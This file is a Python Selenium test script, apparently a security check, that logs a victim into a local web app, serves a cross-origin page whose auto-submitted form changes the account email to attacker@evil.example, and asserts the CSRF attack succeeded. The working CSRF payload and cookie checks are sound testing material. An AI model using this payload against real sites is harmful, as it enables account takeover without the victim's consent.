#!/usr/bin/env python3

import os
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

APP_URL: str       = os.environ.get("APP_URL", "http://localhost:8000")
SELENIUM_URL: str  = os.environ.get("SELENIUM_URL", "http://localhost:4444")
ATTACKER_PORT: int = int(os.environ.get("ATTACKER_PORT", "8001"))

# The attacker page is reachable by the browser at the same host as the app but a
# different port -> a different origin

ATTACKER_URL: str  = os.environ.get("ATTACKER_URL", f"http://localhost:{ATTACKER_PORT}/attack.html")

LOGIN_PAGE: str      = APP_URL + "/login"
VICTIM_EMAIL: str    = "victim@example.com"
VICTIM_PASSWORD: str = "secret123"
ATTACKER_EMAIL: str  = "attacker@evil.example"

results: list[bool] = []

def check(name: str, passed: bool) -> None:
    results.append(bool(passed))
    print(("PASS" if passed else "FAIL") + " - " + name)


ATTACK_HTML = f"""<!doctype html>
<html><body>
<h1>totally innocent page</h1>
<!-- Classic CSRF: a top-level urlencoded form auto-submitted to the victim app.
     The browser attaches the victim's session cookie because there is no CSRF
     protection on /api/account/settings. -->
<form id="csrf" action="{APP_URL}/api/account/settings" method="POST">
  <input type="hidden" name="email" value="{ATTACKER_EMAIL}" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body></html>
"""


class AttackerHandler(BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(ATTACK_HTML.encode("utf-8"))

    def log_message(self, *args):  # silence
        pass


def start_attacker_server() -> ThreadingHTTPServer:
    httpd = ThreadingHTTPServer(("0.0.0.0", ATTACKER_PORT), AttackerHandler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


def make_options() -> Options:
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    return options


def build_driver(timeout: float = 60.0) -> webdriver.Remote:
    deadline: float = time.time() + timeout
    while True:
        try:
            return webdriver.Remote(command_executor=SELENIUM_URL, options=make_options())
        except Exception:
            if time.time() > deadline:
                print("Selenium grid unreachable at " + SELENIUM_URL)
                sys.exit(2)
            time.sleep(1.0)


def wait_for_login_form(driver: webdriver.Remote, timeout: float = 30.0) -> None:
    deadline: float = time.time() + timeout
    while True:
        driver.get(LOGIN_PAGE)
        try:
            WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "[data-testid='submit']"))
            )
            return
        except Exception:
            if time.time() > deadline:
                print("App login page unreachable at " + LOGIN_PAGE)
                sys.exit(2)
            time.sleep(1.0)


def account_email_from_dom(driver: webdriver.Remote) -> str:
    el = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, "[data-testid='account-email']"))
    )
    return el.get_attribute("textContent").strip()


def main() -> None:
    httpd = start_attacker_server()
    driver = build_driver()
    try:
        # Tab A: victim logs in through the React form 
        wait_for_login_form(driver)
        tab_a = driver.current_window_handle

        driver.find_element(By.CSS_SELECTOR, "[data-testid='email']").send_keys(VICTIM_EMAIL)
        driver.find_element(By.CSS_SELECTOR, "[data-testid='password']").send_keys(VICTIM_PASSWORD)
        driver.find_element(By.CSS_SELECTOR, "[data-testid='submit']").click()

        logged_in_email = account_email_from_dom(driver)
        check("tab A: login form logs the victim in", logged_in_email == VICTIM_EMAIL)

        # An active session cookie now exists for the app origin
        cookie = driver.get_cookie("sid")
        check("tab A: active session cookie 'sid' is set", cookie is not None)
        check(
            "tab A: session cookie is not SameSite=Strict (CSRF-exposed)",
            cookie is not None and str(cookie.get("sameSite", "None")).lower() != "strict",
        )

        # same browser, cross-origin attacker page auto-submits the change
        driver.switch_to.new_window("tab")
        tab_b = driver.current_window_handle
        check("attack opens in a separate tab of the same browser", tab_a != tab_b)
        check("both tabs belong to one browser (2 handles)", len(driver.window_handles) == 2)

        driver.get(ATTACKER_URL)
        
        WebDriverWait(driver, 10).until(lambda d: d.current_url.startswith(APP_URL))
        check(
            "attacker POST reached the victim app (cookie attached cross-site)",
            driver.current_url.startswith(APP_URL),
        )

        # confirm the account email was changed WITHOUT the victim's consent
        driver.switch_to.window(tab_a)
        driver.find_element(By.CSS_SELECTOR, "[data-testid='refresh-account']").click()
        time.sleep(0.5)
        after = account_email_from_dom(driver)
        check("CSRF proof: account email changed by the attack", after == ATTACKER_EMAIL)
        check("CSRF proof: email no longer the victim's original", after != VICTIM_EMAIL)
    finally:
        driver.quit()
        httpd.shutdown()

    passed: int = sum(results)
    total: int = len(results)
    print(f"\n{passed}/{total} assertions passed")
    sys.exit(0 if passed == total else 1)


if __name__ == "__main__":
    main()
